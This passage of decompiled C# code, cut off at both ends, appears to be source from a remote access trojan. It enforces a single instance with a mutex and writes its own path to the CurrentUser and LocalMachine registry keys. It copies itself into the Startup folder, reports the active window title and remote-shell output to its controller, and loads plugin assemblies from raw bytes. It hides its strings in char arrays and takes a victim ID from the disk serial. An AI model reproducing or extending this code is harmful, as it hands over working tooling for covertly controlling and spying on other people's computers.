                            NewLateBinding.LateCall(processById, null, "Dispose", new object[0], null, null, null, true);
                            goto Label_018C;
                        }
                        catch (Exception exception15)
                        {
                            ProjectData.SetProjectError(exception15);
                            ProjectData.ClearProjectError();
                            goto Label_018C;
                        }
                    }
                    catch (Exception exception16)
                    {
                        ProjectData.SetProjectError(exception16);
                        Thread.Sleep(0x1388);
                        ProjectData.ClearProjectError();
                        goto Label_018C;
                    }
                }
                if (str2 == new string(new char[] { '.', '.' }))
                {
                    Thread.Sleep(0x1388);
                }
            }
        Label_018C:
            this.method_16();
            try
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (this.method_15(new FileInfo(process.MainModule.FileName), (FileInfo) this.object_10) && (process.Id > Process.GetCurrentProcess().Id))
                        {
                            ProjectData.EndApp();
                        }
                    }
                    catch (Exception exception17)
                    {
                        ProjectData.SetProjectError(exception17);
                        ProjectData.ClearProjectError();
                    }
                }
            }
            catch (Exception exception18)
            {
                ProjectData.SetProjectError(exception18);
                ProjectData.ClearProjectError();
            }
            try
            {
                Mutex.OpenExisting((string) this.object_15);
                ProjectData.EndApp();
            }
            catch (Exception exception19)
            {
                ProjectData.SetProjectError(exception19);
                ProjectData.ClearProjectError();
            }
            try
            {
                this.object_13 = new Mutex(true, (string) this.object_15);
            }
            catch (Exception exception20)
            {
                ProjectData.SetProjectError(exception20);
                ProjectData.EndApp();
                ProjectData.ClearProjectError();
            }
            object instance = new Thread(new ThreadStart(this.method_11), 1);
            NewLateBinding.LateCall(instance, null, "Start", new object[0], null, null, null, true);
            if (this.object_0 != null)
            {
                this.object_5.object_1 = ((string) this.object_6) + new string(new char[] { '.', 'e', 'x', 'e' });
                this.object_5.method_4();
            }
            try
            {
                this.object_8 = new GClass1();
                instance = new Thread(new ThreadStart(this.object_8.method_3), 1);
                NewLateBinding.LateCall(instance, null, "Start", new object[0], null, null, null, true);
            }
            catch (Exception exception21)
            {
                ProjectData.SetProjectError(exception21);
                ProjectData.ClearProjectError();
            }
            int num = 0;
            int num2 = 0;
            string str = "";
            if (this.object_3 == null)
            {
                goto Label_072C;
            }
            try
            {
                SystemEvents.SessionEnding += new SessionEndingEventHandler(this.method_21);
                this.method_0(1);
                goto Label_072C;
            }
            catch (Exception exception22)
            {
                ProjectData.SetProjectError(exception22);
                ProjectData.ClearProjectError();
                goto Label_072C;
            }
        Label_0361:
            try
            {
                num++;
                num2++;
                if (num == 5)
                {
                    try
                    {
                        EmptyWorkingSet((long) Process.GetCurrentProcess().Handle);
                    }
                    catch (Exception exception23)
                    {
                        ProjectData.SetProjectError(exception23);
                        ProjectData.ClearProjectError();
                    }
                }
                if (num > 10)
                {
                    num = 0;
                    if ((this.object_14 != null) && (this.method_10() != str))
                    {
                        str = this.method_10();
                        if ((str != null) && (str.Length > 0))
                        {
                            this.method_8(new string(new char[] { 'a', 'c', 't' }) + ((string) this.object_1) + str);
                        }
                    }
                }
                if (num2 > 7)
                {
                    bool[] flagArray;
                    bool[] flagArray2;
                    num2 = 0;
                    try
                    {
                        object[] arguments = new object[] { this.object_18, true };
                        flagArray = new bool[] { true, false };
                        if (flagArray[0])
                        {
                            this.object_18 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                        }
                        object[] objArray4 = new object[] { this.object_6, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject('"', NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"'), new char[] { ' ', '.', '.' }) };
                        flagArray2 = new bool[] { true, false };
                        NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "OpenSubKey", arguments, null, null, flagArray), null, "SetValue", objArray4, null, null, flagArray2, true);
                        if (flagArray2[0])
                        {
                            this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[0]), typeof(string));
                        }
                    }
                    catch (Exception exception24)
                    {
                        ProjectData.SetProjectError(exception24);
                        ProjectData.ClearProjectError();
                    }
                    try
                    {
                        object[] objArray3 = new object[] { this.object_18, true };
                        flagArray2 = new bool[] { true, false };
                        if (flagArray2[0])
                        {
                            this.object_18 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                        }
                        object[] objArray = new object[] { this.object_6, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject('"', NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"'), new char[] { ' ', '.', '.' }) };
                        flagArray = new bool[] { true, false };
                        NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "LocalMachine", new object[0], null, null, null), null, "OpenSubKey", objArray3, null, null, flagArray2), null, "SetValue", objArray, null, null, flagArray, true);
                        if (flagArray[0])
                        {
                            this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(string));
                        }
                    }
                    catch (Exception exception25)
                    {
                        ProjectData.SetProjectError(exception25);
                        ProjectData.ClearProjectError();
                    }
                    try
                    {
                        System.IO.File.Copy(Conversions.ToString(NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + ((string) this.object_6) + ".exe", true);
                    }
                    catch (Exception exception26)
                    {
                        ProjectData.SetProjectError(exception26);
                        ProjectData.ClearProjectError();
                    }
                }
            }
            catch (Exception exception27)
            {
                ProjectData.SetProjectError(exception27);
                ProjectData.ClearProjectError();
            }
        Label_072C:
            Thread.Sleep(0x3e8);
            goto Label_0361;
        }

        private void method_4()
        {
            try
            {
                this.method_8(new string(new char[] { 'r', 's', 'c' }));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void method_5(object object_21, object object_22)
        {
            try
            {
                object instance = object_22;
                string str = Conversions.ToString(NewLateBinding.LateGet(instance, null, "Data", new object[0], null, null, null));
                NewLateBinding.LateSetComplex(instance, null, "Data", new object[] { str }, null, null, true, false);
                this.method_8(new string(new char[] { 'r', 's' }) + ((string) this.object_1) + this.method_24(ref str));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public object method_6(byte[] byte_0, string string_0)
        {
            object instance = Assembly.Load(byte_0);
            try
            {
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return NewLateBinding.LateGet(instance, null, "CreateInstance", new object[] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(instance, null, "FullName", new object[0], null, null, null)), ",", -1, CompareMethod.Binary)[0] + "." + string_0 }, null, null, null);
        }

        private void method_7()
        {
            this.method_0(0);
        }

        public void method_8(string string_0)
        {
            this.method_3(this.method_20(ref string_0));
        }

        public string method_9()
        {
            string str;
            try
            {
                int num;
                string str3 = null;
                int num2 = 0;
                int num3 = 0;
                string str4 = null;
                GetVolumeInformationA(ref Interaction.Environ("SystemDrive") + @"\", ref str3, 0, ref num, ref num2, ref num3, ref str4, 0);
                str = Conversion.Hex(num);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = new string(new char[] { 'E', 'R', 'R' });
                ProjectData.ClearProjectError();
            }
            return str;
        }

        [DllImport("ntdll")]
        private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);
    }
}

